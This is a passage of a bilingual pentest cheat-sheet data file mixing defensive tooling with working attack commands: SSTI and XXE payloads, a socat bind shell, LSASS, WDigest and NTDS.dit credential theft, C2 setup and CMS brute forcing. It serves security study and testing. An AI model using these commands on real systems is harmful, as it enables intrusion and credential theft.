      { name: { zh: 'TFTP 测试', en: 'TFTP testing' }, command: 'nmap -sU -p 69 target\ntftp target\nget /etc/passwd', description: { zh: 'TFTP 未授权访问测试', en: 'TFTP unauthorized access testing' }, platform: 'linux' },
      { name: { zh: 'IPMI/BMC 测试', en: 'IPMI/BMC testing' }, command: 'nmap -p 623 --script ipmi-version target\nmsf: use auxiliary/scanner/ipmi/ipmi_dumphashes\n# 获取哈希后离线破解', description: { zh: 'IPMI 哈希转储攻击', en: 'IPMI hash dump attack' }, platform: 'linux' }
    ],
    references: ['https://book.hacktricks.xyz/network-services-pentesting']
  },
  {
    id: 'git-operations',
    name: { zh: 'Git 安全操作', en: 'Git Security Operations' },
    description: { zh: 'Git 仓库安全审计和敏感信息挖掘命令', en: 'Git repository security audit and sensitive information mining commands' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    commands: [
      { name: { zh: '历史敏感信息', en: 'Sensitive info in history' }, command: "git log --all --full-history -- '**/*.env'\ngit grep 'password\\|secret\\|token' $(git rev-list --all)\ngit log -p | grep -iE 'password|secret|api_key|token' | head -50", description: { zh: '搜索 Git 历史中的敏感信息', en: 'Search Git history for sensitive information' }, platform: 'all' },
      { name: { zh: 'Gitleaks 扫描', en: 'Gitleaks scan' }, command: 'gitleaks detect --source .\ngitleaks detect --source . --verbose --report-format json -o leaks.json', description: { zh: 'Gitleaks 自动化密钥扫描', en: 'Automated secret scanning with Gitleaks' }, platform: 'all' },
      { name: { zh: 'TruffleHog 扫描', en: 'TruffleHog scan' }, command: 'trufflehog git file://.\ntrufflehog github --repo https://github.com/target/repo', description: { zh: 'TruffleHog 深度密钥扫描', en: 'Deep secret scan with TruffleHog' }, platform: 'all' }
    ],
    references: ['https://github.com/gitleaks/gitleaks']
  },
  {
    id: 'docker-commands',
    name: { zh: 'Docker 管理命令', en: 'Docker Management Commands' },
    description: { zh: 'Docker 容器管理和安全相关命令', en: 'Docker container management and security commands' },
    category: { zh: '容器安全', en: 'Container Security' },
    commands: [
      { name: { zh: '容器信息', en: 'Container info' }, command: 'docker ps -a\ndocker inspect container_name\ndocker logs container_name --tail 100\ndocker stats --no-stream', description: { zh: '容器状态和信息查看', en: 'Container status and information' }, platform: 'linux' },
      { name: { zh: '进入容器', en: 'Enter container' }, command: 'docker exec -it container_name /bin/bash\ndocker exec -it container_name sh\ndocker run -it --rm alpine sh', description: { zh: '进入运行中的容器', en: 'Enter a running container' }, platform: 'linux' },
      { name: { zh: '镜像安全', en: 'Image security' }, command: 'docker scout cves nginx:latest\ntrivy image nginx:latest\ngrype nginx:latest\ndocker history --no-trunc image_name', description: { zh: '容器镜像漏洞扫描', en: 'Container image vulnerability scanning' }, platform: 'linux' },
      { name: { zh: '网络和卷', en: 'Networks and volumes' }, command: 'docker network ls\ndocker volume ls\ndocker network inspect bridge\ndocker volume inspect volume_name', description: { zh: 'Docker 网络和存储卷检查', en: 'Docker network and volume inspection' }, platform: 'linux' }
    ],
    references: ['https://docs.docker.com/reference/']
  },
  {
    id: 'endpoint-security',
    name: { zh: '端点安全检测', en: 'Endpoint Security Detection' },
    description: { zh: 'AV/EDR 检测和端点安全评估命令', en: 'AV/EDR detection and endpoint security assessment commands' },
    category: { zh: '蓝队取证', en: 'Blue Team & DFIR' },
    commands: [
      { name: { zh: 'Windows AV 状态', en: 'Windows AV status' }, command: 'Get-MpComputerStatus\nWMIC /namespace:"\\\\root\\SecurityCenter2" PATH AntiVirusProduct GET displayName,productState\nsc query windefend', description: { zh: '检查 Windows 防病毒状态', en: 'Check Windows antivirus status' }, platform: 'windows' },
      { name: { zh: 'AMSI 测试', en: 'AMSI test' }, command: "# 在 PowerShell 中测试 AMSI\n'amsicontext'\n# AMSI 绕过检测\nGet-Item 'HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers'\nGet-MpPreference | Select-Object -ExpandProperty ExclusionPath", description: { zh: 'AMSI 保护状态检查', en: 'AMSI protection status check' }, platform: 'windows' },
      { name: { zh: 'Linux AV', en: 'Linux AV check' }, command: 'clamscan -r /tmp/\nfreshclam && clamscan -r --bell -i /\n# ClamAV\napt install clamav && clamscan -r /home/', description: { zh: 'Linux ClamAV 病毒扫描', en: 'Linux ClamAV virus scanning' }, platform: 'linux' }
    ],
    references: ['https://www.microsoft.com/en-us/windows/comprehensive-security']
  },


  {
    id: 'pivoting-techniques',
    name: { zh: '网络枢转技术速查', en: 'Network Pivoting Techniques' },
    description: { zh: '内网枢转技术完整命令速查', en: 'Complete command reference for internal network pivoting techniques' },
    category: { zh: '隧道代理', en: 'Tunneling & Proxy' },
    commands: [
      { name: { zh: '双向端口转发', en: 'Bidirectional port forwarding' }, command: '# 本地 → 远程\nssh -L 8080:target:80 jump\n# 远程 → 本地\nssh -R 4444:localhost:4444 jump\n# 双向\nssh -L 8080:target:80 -R 4444:localhost:4444 jump', description: { zh: 'SSH 双向端口转发', en: 'Bidirectional SSH port forwarding' }, platform: 'linux' },
      { name: { zh: '多层代理链', en: 'Multi-layer proxy chain' }, command: '# Layer 1: 攻击者 SOCKS5 at 1080\nssh -D 1080 -N jump1\n# Layer 2: 通过 Layer1 连接更深一层\nproxychains ssh -D 1081 -N jump2\n# Layer 3\nproxychains -q -f /etc/proxychains_l2.conf ssh -D 1082 jump3', description: { zh: '三层嵌套代理链', en: 'Three-layer nested proxy chain' }, platform: 'linux' },
      { name: { zh: 'Meterpreter 路由', en: 'Meterpreter routing' }, command: 'sessions -l\nrun autoroute -s 10.10.20.0/24\nbg\nuse auxiliary/server/socks_proxy\nset VERSION 5; set SRVPORT 1080; run -j', description: { zh: 'Meterpreter 自动路由+SOCKS', en: 'Meterpreter auto-route with SOCKS proxy' }, platform: 'linux' }
    ],
    references: ['https://github.com/jpillora/chisel']
  },
  {
    id: 'macro-analysis',
    name: { zh: '恶意宏和脚本分析', en: 'Malicious Macro and Script Analysis' },
    description: { zh: '恶意 Office 宏和脚本文件分析工具', en: 'Malicious Office macro and script file analysis tools' },
    category: { zh: '蓝队取证', en: 'Blue Team & DFIR' },
    commands: [
      { name: { zh: 'oletools 分析', en: 'oletools analysis' }, command: 'olevba document.docm\nmacro_pack -d document.xlsm\noleid document.doc\nrtfobj file.rtf', description: { zh: 'Office 宏安全分析', en: 'Office macro security analysis' }, platform: 'all' },
      { name: { zh: 'PowerShell 脚本分析', en: 'PowerShell script analysis' }, command: '# 解混淆\n$code = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("BASE64"))\n# 分析\nGet-Content script.ps1 | Select-String -Pattern "Invoke|Download|iex|eval"\n# amsi 扫描\n[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")', description: { zh: 'PowerShell 混淆脚本分析', en: 'Analyze obfuscated PowerShell scripts' }, platform: 'windows' },
      { name: { zh: 'JS 脚本去混淆', en: 'JS deobfuscation' }, command: '# node.js\nnode -e "eval(require(\\"fs\\").readFileSync(\\"mal.js\\",\\"utf8\\"))" 2>&1 | head\n# browser console\n# 替换 eval/document.write 为 console.log', description: { zh: 'JavaScript 恶意脚本分析', en: 'Analyze malicious JavaScript' }, platform: 'all' }
    ],
    references: ['https://github.com/decalage2/oletools']
  },
  {
    id: 'ctf-tools-linux',
    name: { zh: 'CTF Linux 工具速查', en: 'CTF Linux Tools Reference' },
    description: { zh: 'CTF 在 Linux 环境下常用工具命令', en: 'Common tool commands for CTF on Linux' },
    category: { zh: 'CTF/Misc', en: 'CTF / Misc' },
    commands: [
      { name: { zh: '二进制分析基础', en: 'Binary analysis basics' }, command: 'file binary; checksec binary\nreadelf -h binary; ldd binary\nobjdump -d binary | head -50\ngdb -q binary', description: { zh: '二进制文件初步分析流程', en: 'Initial binary file analysis workflow' }, platform: 'linux' },
      { name: { zh: '常用编解码', en: 'Common encoding/decoding' }, command: 'echo "dGVzdA==" | base64 -d\necho "68656c6c6f" | xxd -r -p\nprintf "%b" "\\x68\\x65\\x6c\\x6c\\x6f"\npython3 -c "print(bytes.fromhex(\\"48656c6c6f\\").decode())"', description: { zh: '常见编码快速解码', en: 'Quick decoding of common encodings' }, platform: 'linux' },
      { name: { zh: '网络工具', en: 'Network tools' }, command: 'nc -lvnp 4444\nnc target 4444 < payload\nsocat TCP-LISTEN:4444,fork EXEC:/bin/sh\npwncat-cs -lp 4444', description: { zh: 'CTF 网络监听和连接', en: 'CTF network listening and connecting' }, platform: 'linux' },
      { name: { zh: '提取数据', en: 'Extract data' }, command: 'strings -a file | grep -E "flag{|CTF{|picoCTF{"\nxxd file | grep -i "flag"\nbinwalk -e file && find . -name "flag*"', description: { zh: '从文件中提取 CTF flag', en: 'Extract CTF flag from files' }, platform: 'linux' }
    ],
    references: ['https://ctf-wiki.org/']
  },
  {
    id: 'web-cms-attacks',
    name: { zh: 'CMS 攻击速查', en: 'CMS Attack Quick Reference' },
    description: { zh: '常见 CMS 平台漏洞利用命令', en: 'Common CMS platform vulnerability exploitation commands' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    commands: [
      { name: { zh: 'WordPress 攻击', en: 'WordPress attacks' }, command: 'wpscan --url https://target.com -e u,p,t,tt --api-token TOKEN\nwpscan --url https://target.com -U admin -P rockyou.txt\n# XML-RPC 爆破\npython xmlrpc_brute.py --url http://target.com/xmlrpc.php', description: { zh: 'WordPress 漏洞扫描和利用', en: 'WordPress vulnerability scan and exploitation' }, platform: 'all' },
      { name: { zh: 'Joomla 攻击', en: 'Joomla attacks' }, command: 'joomscan -u http://target.com\ndroopescan scan joomla -u http://target.com\npython joomblah.py http://target.com', description: { zh: 'Joomla 漏洞扫描', en: 'Joomla vulnerability scanning' }, platform: 'all' },
      { name: { zh: 'Drupal 攻击', en: 'Drupal attacks' }, command: 'droopescan scan drupal -u http://target.com\n# Drupalgeddon2 (CVE-2018-7600)\npython drupalgeddon2.py http://target.com', description: { zh: 'Drupal 漏洞扫描', en: 'Drupal vulnerability scanning' }, platform: 'all' },
      { name: { zh: 'Magento 攻击', en: 'Magento attacks' }, command: 'magescan scan:all http://target.com\n# SQL 注入\nsqlmap -u "http://target.com/index.php/catalogsearch/result/?q=test" -p q', description: { zh: 'Magento 漏洞扫描', en: 'Magento vulnerability scanning' }, platform: 'all' }
    ],
    references: ['https://github.com/wpscanteam/wpscan']
  },


  {
    id: 'shodan-advanced',
    name: { zh: 'Shodan 高级搜索', en: 'Shodan Advanced Search' },
    description: { zh: 'Shodan 高级搜索语法和自动化 API 用法', en: 'Shodan advanced search syntax and automated API usage' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    commands: [
      { name: { zh: '工控系统搜索', en: 'ICS/SCADA search' }, command: 'port:102 Siemens  # S7 PLC\nport:502 modbus\nport:44818 tag:ics\nport:20000 dnp3\nport:2404 IEC-104', description: { zh: 'Shodan 搜索工控设备', en: 'Search for ICS/SCADA devices on Shodan' }, platform: 'all' },
      { name: { zh: '摄像头搜索', en: 'Camera search' }, command: 'has_screenshot:true product:"Hikvision"\nport:554 rtsp\nport:8080 webcam\ntitle:"IP Camera" country:CN\nhttp.title:"Live View"', description: { zh: 'Shodan 搜索网络摄像头', en: 'Search network cameras on Shodan' }, platform: 'all' },
      { name: { zh: 'Shodan API 脚本', en: 'Shodan API script' }, command: "import shodan\napi = shodan.Shodan('YOUR_KEY')\nresults = api.search('org:\"Target Corp\"')\nfor r in results['matches']:\n    print(r['ip_str'], r['port'])", description: { zh: 'Shodan Python API 使用', en: 'Shodan Python API usage' }, platform: 'all' },
      { name: { zh: '监控器搜索', en: 'Monitor search' }, command: 'tag:malware\ntag:honeypot\nvuln:CVE-2017-0144  # EternalBlue 暴露的主机\nvuln:CVE-2021-44228  # Log4Shell', description: { zh: 'Shodan 漏洞和标签搜索', en: 'Shodan vulnerability and tag search' }, platform: 'all' }
    ],
    references: ['https://developer.shodan.io/api']
  },
  {
    id: 'reverse-engineering-tricks',
    name: { zh: '逆向工程技巧', en: 'Reverse Engineering Tricks' },
    description: { zh: '二进制逆向工程常用技巧速查', en: 'Common binary reverse engineering tricks quick reference' },
    category: { zh: '逆向工程', en: 'Reverse Engineering' },
    commands: [
      { name: { zh: 'Anti-debug 绕过', en: 'Anti-debug bypass' }, command: '# ptrace 检测绕过\ngdb -ex "catch syscall ptrace" -ex "commands; set $rax=0; continue; end" -ex run ./binary\n# IsDebuggerPresent 绕过 (Windows x64dbg)\n# 断点 IsDebuggerPresent → 修改 EAX=0', description: { zh: '常见反调试检测绕过', en: 'Common anti-debugging bypass techniques' }, platform: 'linux' },
      { name: { zh: '加壳脱壳', en: 'Unpack executables' }, command: '# UPX\nupx -d packed.exe\n# 其他壳: 动态脱壳\n# 用 x64dbg OEP 断点\n# 或 PE-bear/PEiD 识别壳类型', description: { zh: '常见加壳工具脱壳', en: 'Unpack common executable packers' }, platform: 'all' },
      { name: { zh: 'Ghidra 批量脚本', en: 'Ghidra batch script' }, command: './analyzeHeadless /tmp/proj Proj -import *.bin -postScript FindStrings.java -noanalysis\n# 批量分析多个二进制\nfind . -name "*.so" | xargs -I{} ./analyzeHeadless /tmp/p P -import {}', description: { zh: 'Ghidra 无头模式批量分析', en: 'Ghidra headless batch analysis' }, platform: 'linux' },
      { name: { zh: 'Frida hook 脚本', en: 'Frida hook script' }, command: "// frida -U -f com.target.app -l hook.js\nJava.perform(function() {\n  var Activity = Java.use('android.app.Activity');\n  Activity.onResume.implementation = function() {\n    console.log('onResume called');\n    this.onResume();\n  };\n});", description: { zh: 'Frida Java hook 模板', en: 'Frida Java hook template' }, platform: 'all' }
    ],
    references: ['https://frida.re/docs/javascript-api/']
  },
  {
    id: 'post-exploitation-tools',
    name: { zh: '后渗透工具速查', en: 'Post-Exploitation Tools Reference' },
    description: { zh: '后渗透阶段工具和技术速查', en: 'Post-exploitation phase tools and techniques reference' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    commands: [
      { name: { zh: 'Havoc C2', en: 'Havoc C2 framework' }, command: '# 启动 Teamserver\n./havoc server --profile profiles/default.yaotl\n# 生成 Demon Agent\n# GUI: New Payload → Demon', description: { zh: 'Havoc 现代 C2 框架', en: 'Havoc modern C2 framework' }, platform: 'linux' },
      { name: { zh: 'Sliver C2', en: 'Sliver C2 framework' }, command: './sliver-server\n# 交互模式\ngenerate --http target.com --os windows\nlisteners\nnew-listener --http\nuse SESSION_ID', description: { zh: 'Sliver 开源 C2 框架', en: 'Sliver open-source C2 framework' }, platform: 'linux' },
      { name: { zh: 'BOF 开发', en: 'BOF development' }, command: '# Beacon Object File (Cobalt Strike/Havoc)\n# C 代码编译\ncl.exe /c bof.c /GS-\nobjcopy -O binary bof.obj bof.o\n# 执行\nbeacon> inline-execute bof.o', description: { zh: 'Beacon Object File 开发', en: 'Beacon Object File development' }, platform: 'windows' },
      { name: { zh: 'Cobalt Strike Aggressor', en: 'Cobalt Strike Aggressor Script' }, command: '# Aggressor 脚本示例\nalias mycommand {\n  blog($1, "Running command...");\n  bshell($1, "whoami");\n}\non beacon_initial { note($1, "Beacon: " . binfo($1, "computer")); }', description: { zh: 'Cobalt Strike Aggressor 脚本', en: 'Cobalt Strike Aggressor script examples' }, platform: 'all' }
    ],
    references: ['https://github.com/HavocFramework/Havoc', 'https://github.com/BishopFox/sliver']
  },
  {
    id: 'ctf-pwn-heap',
    name: { zh: 'CTF 堆漏洞利用', en: 'CTF Heap Exploitation' },
    description: { zh: 'CTF 堆漏洞利用技术速查', en: 'CTF heap exploitation techniques quick reference' },
    category: { zh: 'CTF/PWN', en: 'CTF / PWN' },
    commands: [
      { name: { zh: '堆基础速查', en: 'Heap basics' }, command: '# chunk 结构: prev_size | size | fd | bk\n# bins: fastbin, tcache, unsorted, small, large\n# 工具\npwndbg> heap\npwndbg> bins\npwndbg> vis_heap_chunks 20', description: { zh: '堆结构和工具速查', en: 'Heap structure and tools reference' }, platform: 'linux' },
      { name: { zh: 'tcache 中毒', en: 'tcache poisoning' }, command: "# Double free → tcache dup → 任意地址写\nfrom pwn import *\n# 分配两个 chunk\nmalloc(0x20); malloc(0x20)\n# double free A\nfree(chunk_a); free(chunk_a)\n# 分配覆盖 fd 指针\nmalloc(0x20); write(fake_addr)\n# 获取目标地址\nmalloc(0x20); malloc(0x20)  # -> target", description: { zh: 'tcache double-free 中毒', en: 'tcache double-free poisoning' }, platform: 'linux' },
      { name: { zh: 'House of Force', en: 'House of Force (brk)' }, command: '# 条件: 可控 top chunk size + 任意大小 malloc\n# 1. 溢出写 top chunk size = -1\n# 2. 申请超大块使 top chunk 移动到目标地址\n# 3. 申请小块获取目标', description: { zh: 'House of Force 技术', en: 'House of Force technique' }, platform: 'linux' },
      { name: { zh: 'Unsorted Bin 泄露', en: 'Unsorted Bin leak' }, command: "# 释放 > 0x400 的 chunk 进入 unsorted bin\n# fd/bk 指向 libc main_arena\nfrom pwn import *\nfree(large_chunk)\n# 读取 fd/bk 泄露 libc 地址\nleak = read(chunk_addr)\nlibc_base = leak - offset", description: { zh: 'Unsorted Bin 泄露 libc 地址', en: 'Leak libc address via Unsorted Bin' }, platform: 'linux' }
    ],
    references: ['https://heap-exploitation.dhavalkapil.com/']
  },


  {
    id: 'supply-chain-security',
    name: { zh: '供应链安全工具', en: 'Supply Chain Security Tools' },
    description: { zh: '软件供应链安全扫描和检测工具', en: 'Software supply chain security scanning and detection tools' },
    category: { zh: '云原生安全', en: 'Cloud Native Security' },
    commands: [
      { name: { zh: 'Syft SBOM 生成', en: 'Syft SBOM generation' }, command: 'syft dir:. -o spdx-json > sbom.json\nsyft nginx:latest -o cyclonedx-json', description: { zh: '生成软件物料清单 SBOM', en: 'Generate Software Bill of Materials (SBOM)' }, platform: 'all' },
      { name: { zh: 'Grype 漏洞扫描', en: 'Grype vulnerability scan' }, command: 'grype dir:.\ngrype nginx:latest\ngrype sbom:sbom.json', description: { zh: 'Grype 依赖漏洞扫描', en: 'Grype dependency vulnerability scanning' }, platform: 'all' },
      { name: { zh: 'Semgrep 静态分析', en: 'Semgrep static analysis' }, command: 'semgrep --config=auto .\nsemgrep --config p/security-audit .\nsemgrep --config p/owasp-top-ten src/', description: { zh: 'Semgrep 代码安全静态分析', en: 'Semgrep code security static analysis' }, platform: 'all' },
      { name: { zh: 'Dependency Check', en: 'OWASP Dependency Check' }, command: 'dependency-check --scan . --format HTML\ndependency-check --project myapp --scan /path/to/app', description: { zh: 'OWASP 依赖漏洞检查', en: 'OWASP dependency vulnerability check' }, platform: 'all' }
    ],
    references: ['https://github.com/anchore/syft']
  },
  {
    id: 'network-scanning-advanced',
    name: { zh: '高级网络扫描', en: 'Advanced Network Scanning' },
    description: { zh: '高级网络扫描和服务识别技术', en: 'Advanced network scanning and service identification techniques' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    commands: [
      { name: { zh: 'Masscan + Nmap 组合', en: 'Masscan + Nmap combo' }, command: 'masscan -p1-65535 target/24 --rate=1000 -oG masscan.txt\ngrep "open" masscan.txt | awk "{print $4}" | cut -d/ -f1 | sort -un > ports.txt\nnmap -sV -sC -p$(cat ports.txt | tr "\\n" ",") target', description: { zh: '快速全端口扫描后精细探测', en: 'Fast full-port scan followed by detailed probing' }, platform: 'linux' },
      { name: { zh: 'Nmap IPv6 扫描', en: 'Nmap IPv6 scan' }, command: 'nmap -6 target_ipv6\nnmap -6 -sV fe80::1 --source-interface eth0\nnmap --script ipv6-node-info target', description: { zh: 'IPv6 目标扫描', en: 'IPv6 target scanning' }, platform: 'linux' },
      { name: { zh: '防火墙规则发现', en: 'Firewall rule discovery' }, command: 'nmap -sA target  # ACK 扫描\nnmap -sW target  # Window 扫描\nnmap --badsum target  # 校验错误包\nnmap -f --mtu 8 target  # 分片', description: { zh: '发现防火墙规则和过滤', en: 'Discover firewall rules and filtering' }, platform: 'linux' }
    ],
    references: ['https://nmap.org/book/']
  },
  {
    id: 'ctf-web-advanced',
    name: { zh: 'CTF Web 高级技巧', en: 'CTF Web Advanced Tricks' },
    description: { zh: 'CTF Web 题目高级解题技巧', en: 'Advanced solving tricks for CTF web challenges' },
    category: { zh: 'CTF/Web', en: 'CTF / Web' },
    commands: [
      { name: { zh: '反序列化利用链', en: 'Deserialization exploit chain' }, command: "# PHP 常用链\n# Laravel gadget\nphpggc Laravel/RCE1 system id | base64\n# Symfony\nphpggc Symfony/RCE4 exec whoami\n# 自定义 POP 链\n# __construct → __sleep → __wakeup → __toString → __call", description: { zh: 'PHP 反序列化 POP 链利用', en: 'PHP deserialization POP chain exploitation' }, platform: 'all' },
      { name: { zh: 'Flask Pin 码计算', en: 'Flask Werkzeug Pin calculation' }, command: "# 通过 /proc/self/cgroup 等读取信息\n# 然后计算 Pin 码\nimport hashlib\npublic_bits = [username, modname, appname, app_root, mac, machine_id]\nprint(hashlib.md5(''.join(public_bits).encode()).hexdigest()[:9])", description: { zh: '计算 Flask Werkzeug 调试 Pin', en: 'Calculate Flask Werkzeug debug Pin' }, platform: 'all' },
      { name: { zh: 'XXE via SVG/XLSX', en: 'XXE via SVG/XLSX upload' }, command: "# SVG XXE\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<svg><text>&xxe;</text></svg>\n\n# XLSX XXE\n# 解压 xlsx,修改 xl/workbook.xml 注入 DTD", description: { zh: '通过文件上传触发 XXE', en: 'Trigger XXE via file upload' }, platform: 'all' },
      { name: { zh: 'SSTI 到 RCE', en: 'SSTI to RCE' }, command: "# Jinja2\n{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}\n# 绕过\n{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')}}", description: { zh: 'Jinja2 SSTI RCE Payload', en: 'Jinja2 SSTI to RCE payloads' }, platform: 'all' }
    ],
    references: ['https://github.com/swisskyrepo/PayloadsAllTheThings']
  },
  {
    id: 'active-directory-enumeration',
    name: { zh: 'AD 域内枚举速查', en: 'AD Domain Enumeration Reference' },
    description: { zh: 'Active Directory 域内快速枚举命令', en: 'Quick Active Directory domain enumeration commands' },
    category: { zh: '域渗透', en: 'Domain Penetration' },
    commands: [
      { name: { zh: 'net 域枚举', en: 'net domain enumeration' }, command: 'net user /domain\nnet group /domain\nnet group "Domain Admins" /domain\nnet group "Domain Controllers" /domain\nlocalhost: net computers /domain', description: { zh: 'Windows net 命令域枚举', en: 'Windows net command domain enumeration' }, platform: 'windows' },
      { name: { zh: 'PowerShell AD 枚举', en: 'PowerShell AD enumeration' }, command: 'Get-ADUser -Filter * | Select-Object SamAccountName,Enabled\nGet-ADGroup -Filter * | Select-Object Name\nGet-ADComputer -Filter * | Select-Object Name,OperatingSystem\nGet-ADDomainController -Filter *', description: { zh: 'PowerShell AD 模块枚举', en: 'PowerShell AD module enumeration' }, platform: 'windows' },
      { name: { zh: 'ldapsearch 枚举', en: 'ldapsearch enumeration' }, command: "ldapsearch -x -H ldap://dc_ip -D 'user@domain.com' -w password -b 'DC=domain,DC=com' '(objectClass=user)' sAMAccountName\nldapsearch -x -H ldap://dc_ip -b 'DC=domain,DC=com' '(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=com)'", description: { zh: 'LDAP 搜索枚举 AD 对象', en: 'Enumerate AD objects via LDAP search' }, platform: 'linux' }
    ],
    references: ['https://book.hacktricks.xyz/windows-hardening/active-directory-methodology']
  },


  {
    id: 'ctf-forensics-advanced',
    name: { zh: 'CTF 取证高级技术', en: 'CTF Advanced Forensics Techniques' },
    description: { zh: 'CTF 取证题高级解题技术', en: 'Advanced solving techniques for CTF forensics challenges' },
    category: { zh: 'CTF/取证', en: 'CTF / Forensics' },
    commands: [
      { name: { zh: '内存取证高级', en: 'Advanced memory forensics' }, command: "# Volatility3 完整流程\nvol3 -f mem.raw windows.info\nvol3 -f mem.raw windows.pslist > procs.txt\nvol3 -f mem.raw windows.cmdline > cmds.txt\nvol3 -f mem.raw windows.filescan | grep -i 'flag\\|secret'\nvol3 -f mem.raw windows.dumpfiles --pid SUSPICIOUS_PID -o /tmp/dump/", description: { zh: '内存取证完整分析流程', en: 'Complete memory forensics analysis workflow' }, platform: 'all' },
      { name: { zh: '磁盘取证高级', en: 'Advanced disk forensics' }, command: 'mmls disk.img\nfls -r -m / disk.img > all_files.txt\nicat disk.img INODE > recovered_file\ntsk_recover -e disk.img /tmp/recovered/', description: { zh: '磁盘镜像深度分析', en: 'Deep disk image analysis' }, platform: 'linux' },
      { name: { zh: 'PCAP 深度分析', en: 'Deep PCAP analysis' }, command: "# 提取所有文件\ntshark -r capture.pcap --export-objects smb,./smb_objects/\ntshark -r capture.pcap --export-objects http,./http_objects/\n# 分析 SSL/TLS\ntshark -r capture.pcap -o tls.keylog_file:ssl_keys.log -Y 'http' -T text", description: { zh: 'PCAP 深度分析提取', en: 'Deep PCAP analysis and extraction' }, platform: 'all' },
      { name: { zh: '隐写深度分析', en: 'Deep steganography analysis' }, command: "# 图片通道分析\nconvert image.png -separate channels/channel_%d.png\n# 视频帧提取\nffmpeg -i video.mp4 -vf fps=1 frame_%04d.png\n# 音频频谱\nsox audio.wav -n spectrogram -o spec.png\naplay audio.wav; audacity audio.wav", description: { zh: '多媒体隐写深度分析', en: 'Deep steganography analysis for multimedia' }, platform: 'linux' }
    ],
    references: ['https://volatility3.readthedocs.io/']
  },
  {
    id: 'enumeration-automation',
    name: { zh: '枚举自动化脚本', en: 'Enumeration Automation Scripts' },
    description: { zh: '渗透测试自动化枚举脚本模板', en: 'Pentest enumeration automation script templates' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    commands: [
      { name: { zh: 'Python 端口扫描', en: 'Python port scanner' }, command: "import socket, threading\ndef scan(ip, port):\n    s = socket.socket()\n    s.settimeout(0.5)\n    if s.connect_ex((ip, port)) == 0:\n        print(f'{port}/tcp open')\n    s.close()\nip = '192.168.1.1'\n[threading.Thread(target=scan, args=(ip, p)).start() for p in range(1, 1025)]", description: { zh: 'Python 多线程端口扫描', en: 'Python multithreaded port scanner' }, platform: 'all' },
      { name: { zh: 'Bash 自动枚举', en: 'Bash auto enumeration' }, command: "#!/bin/bash\nTARGET=$1\nnmap -sC -sV -oA nmap_$TARGET $TARGET\ngobuster dir -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/common.txt -o gobuster_$TARGET.txt\necho 'Done!' && cat nmap_$TARGET.nmap gobuster_$TARGET.txt", description: { zh: 'Bash 自动化枚举脚本', en: 'Bash automated enumeration script' }, platform: 'linux' },
      { name: { zh: 'Web 侦察一键脚本', en: 'One-click web recon' }, command: "#!/bin/bash\nDOMAIN=$1\nsubfinder -d $DOMAIN -silent | httpx -silent | tee alive.txt | nuclei -t cves/ -severity high,critical -o vulns.txt\necho \"Done: $(wc -l < alive.txt) alive, $(wc -l < vulns.txt) vulns\"", description: { zh: 'subfinder + httpx + nuclei 串联自动化', en: 'Automated subfinder + httpx + nuclei pipeline' }, platform: 'linux' },
      { name: { zh: 'SMB 快速侦察', en: 'SMB quick recon' }, command: 'nmap -p 445 --open 192.168.1.0/24 -oG - | grep "Ports" | awk "{print $2}" | xargs -I{} crackmapexec smb {} --shares', description: { zh: 'SMB 批量发现和枚举', en: 'Bulk SMB discovery and share enumeration' }, platform: 'linux' },
    ],
    references: ['https://www.python.org/']
  },


  {
    id: 'windows-pentest-advanced',
    name: { zh: 'Windows 高级渗透技术', en: 'Advanced Windows Penetration Techniques' },
    description: { zh: 'Windows 高级渗透攻击技术速查', en: 'Advanced Windows penetration attack techniques reference' },
    category: { zh: 'Windows渗透', en: 'Windows Penetration' },
    commands: [
      { name: { zh: '凭证访问 LSASS', en: 'LSASS credential access' }, command: '# 方法1: Task Manager\n# 方法2: procdump\nprocdump.exe -ma lsass.exe lsass.dmp\n# 方法3: comsvcs.dll\nrundll32.exe c:\\windows\\system32\\comsvcs.dll, MiniDump (Get-Process lsass).id lsass.dmp full\n# 方法4: Mimikatz\nsekurlsa::logonpasswords', description: { zh: 'LSASS 进程凭证提取', en: 'Extract credentials from LSASS process' }, platform: 'windows' },
      { name: { zh: 'WDigest 明文密码', en: 'WDigest plaintext password' }, command: '# 启用 WDigest (需要用户重新登录)\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n# 然后用 Mimikatz\nsekurlsa::wdigest', description: { zh: '启用 WDigest 获取明文密码', en: 'Enable WDigest to obtain plaintext password' }, platform: 'windows' },
      { name: { zh: 'Kerberos 票据', en: 'Kerberos ticket operations' }, command: 'klist  # 列出票据\nklist purge  # 清空票据\nRubeus.exe dump  # 导出所有票据\nRubeus.exe ptt /ticket:BASE64  # 注入票据', description: { zh: 'Kerberos 票据管理', en: 'Kerberos ticket management' }, platform: 'windows' },
      { name: { zh: 'NTDS.dit 提取', en: 'NTDS.dit extraction' }, command: '# VSS 卷影复制\nvssadmin create shadow /for=C:\ncd \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\ncopy Windows\\NTDS\\NTDS.dit C:\\NTDS.dit\nreg save HKLM\\SYSTEM C:\\SYSTEM\n# 离线解析\nsecretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL', description: { zh: '提取 NTDS.dit 域哈希', en: 'Extract domain hashes from NTDS.dit' }, platform: 'windows' }
    ],
    references: ['https://book.hacktricks.xyz/windows-hardening/active-directory-methodology']
  },
  {
    id: 'aws-advanced-attacks',
    name: { zh: 'AWS 高级攻击', en: 'AWS Advanced Attacks' },
    description: { zh: 'AWS 环境高级攻击技术', en: 'Advanced attack techniques in AWS environments' },
